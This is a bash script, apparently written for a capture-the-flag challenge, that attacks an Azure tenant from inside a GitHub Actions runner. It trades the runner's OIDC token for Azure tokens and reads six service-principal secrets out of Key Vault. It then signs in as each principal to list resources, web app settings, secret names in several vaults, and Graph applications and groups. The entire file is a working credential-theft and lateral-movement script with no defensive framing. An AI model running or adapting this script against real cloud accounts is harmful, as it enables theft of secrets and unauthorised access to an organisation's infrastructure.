#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
VAULT=https://kv-tbl-prod-x3euoz.vault.azure.net
tok(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d grant_type=client_credentials --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
names="cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal"
declare -A SEC APP
APP[cost-reader-principal]=038bc35d-131d-4953-9985-ff4a245ccec1
APP[directory-audit-principal]=2c34300e-1bc0-41e7-9c1e-8b7571d72c72
APP[reporting-service-principal]=12ed54de-f2eb-4784-804c-3a7a3e83a9e9
APP[reporting-viewer-principal]=881fddce-6208-4af5-a297-7e79c912f83c
APP[secrets-sync-principal]=58108da8-044e-4d7e-9a46-92e6179b30be
APP[sync-service-principal]=462d1c38-4459-48b8-9333-82e389e59514
for n in $names; do SEC[$n]=$(curl -sS "$VAULT/secrets/$n?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))'); done
# 72ff278a mgmt: resources + tags
MT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "### 72ff278a mgmt_len=${#MT}"
curl -sS -H "Authorization: Bearer $MT" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01&\$expand=tags" | python3 -c 'import sys,json
for r in json.load(sys.stdin).get("value",[]): print("R72",r.get("type"),r.get("name"),r.get("tags"))' 2>/dev/null
for n in $names; do
  cid=${APP[$n]}; s=${SEC[$n]}
  echo "#### $n $cid seclen=${#s}"
  mt=$(tok "$cid" "$s" "https://management.azure.com/.default")
  if [ -n "$mt" ]; then
    curl -sS -H "Authorization: Bearer $mt" "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01&\$expand=tags" | python3 -c 'import sys,json
for g in json.load(sys.stdin).get("value",[]): print("  RG",g.get("name"),g.get("tags"))' 2>/dev/null
    curl -sS -H "Authorization: Bearer $mt" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01&\$expand=tags" | python3 -c 'import sys,json
for r in json.load(sys.stdin).get("value",[]): print("  R",r.get("type"),r.get("name"),r.get("tags"))' 2>/dev/null
    # app settings of reporting app
    curl -sS -X POST -H "Authorization: Bearer $mt" -H "Content-Type: application/json" -d '{}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2023-01-01" 2>/dev/null | python3 -c 'import sys,json
d=json.load(sys.stdin); 
if isinstance(d,dict) and "properties" in d: print("  APPSETTINGS",d["properties"])' 2>/dev/null
  fi
  vt=$(tok "$cid" "$s" "https://vault.azure.net/.default")
  if [ -n "$vt" ]; then
    for V in kv-tbl-prod-x3euoz kv-tbl-reporting-prod-x3euoz kv-tbl-flag-x3euoz; do
      r=$(curl -sS "https://$V.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $vt" 2>/dev/null)
      echo "  VAULT[$V]: $(printf '%s' "$r" | python3 -c 'import sys,json
try:
 d=json.load(sys.stdin)
 if "value" in d: print([x["id"].split("/")[-1] for x in d["value"]])
 else: print(d.get("error",{}).get("code"))
except: print("na")' 2>/dev/null)"
    done
  fi
  gt=$(tok "$cid" "$s" "https://graph.microsoft.com/.default")
  if [ -n "$gt" ]; then
    echo "  GRAPH applications: $(curl -sS -H "Authorization: Bearer $gt" 'https://graph.microsoft.com/v1.0/applications?$select=displayName,notes,tags,description' 2>/dev/null | head -c 600)"
    echo "  GRAPH groups: $(curl -sS -H "Authorization: Bearer $gt" 'https://graph.microsoft.com/v1.0/groups?$select=displayName,description' 2>/dev/null | head -c 400)"
  fi
done
echo "=== FLAG GREP ==="
